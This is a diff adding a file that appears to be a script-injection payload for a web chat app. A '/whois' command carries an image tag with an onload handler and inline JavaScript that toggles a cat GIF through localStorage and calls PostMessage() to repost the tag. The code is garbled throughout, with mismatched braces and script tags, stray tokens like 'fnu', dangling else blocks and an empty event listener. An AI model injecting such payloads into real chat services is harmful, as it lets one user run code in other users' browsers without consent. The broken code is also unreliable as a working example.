@@ -1,0 +1,49 @@
+/whois  <img src = http://68.media.tumblr.com/29efd44df56d6d5c9a2bd6d3897f7d8a/tumblr_o0jy6lfU7R1tx7omgo1_500.gif height = 300 width = 300 id = 'CYBER_KITTY' onload="hide()"/>
+<script>
+function hide()
+{
+	console.log("in hide")
+	if (localStorage.length > 0 && localStorage.getItem(0) == username)
+	{
+		document.getElementById("CYBER_KITTY")
+		{
+			console.log("gone!")
+			document.getElementById("CYBER_KITTY").hidden = true;
+		}
+	}
+	else
+	{
+		localStorage.setItem(0, username);
+	}
+}
+</script>
+window.addEventListener("unload", hide());
+window.addEventListener("pageshow", hide());
+document.getElementById("channel-area").addEventListener("")
+if (localStorage.length == 0) 
+{
+    document.getElementById("message").innerText = '<img src = http://68.media.tumblr.com/29efd44df56d6d5c9a2bd6d3897f7d8a/tumblr_o0jy6lfU7R1tx7omgo1_500.gif height = 300 width = 300 id = "CYBER_KITTY"/>'
+    PostMessage();
+}
+
+
+document.getElementById("message-area").addEventListener("hashchange", function() {
+	myStorage = localStorage;
+	document.getElementById(myStorage.length > 0)
+	{
+		console.log("gone!")
+		document.getElementById("CYBER_KITTY").hidden = true;
+	}
+});</script>
+    document.getElementById("CYBER_KITTY").addEventListener("load", function(){    var image = document.getElementById("CYBER_KITTY");
+    	image.hidden = true; console.log("Image is gone!")})
+    myStorage.setItem(0, "CYBER_KITTY");fnu
+    
+}
+else
+</script>
+else
+{
+    var image = document.getElementById("CYBER_KITTY");
+    image.hidden = true;
+}</script>
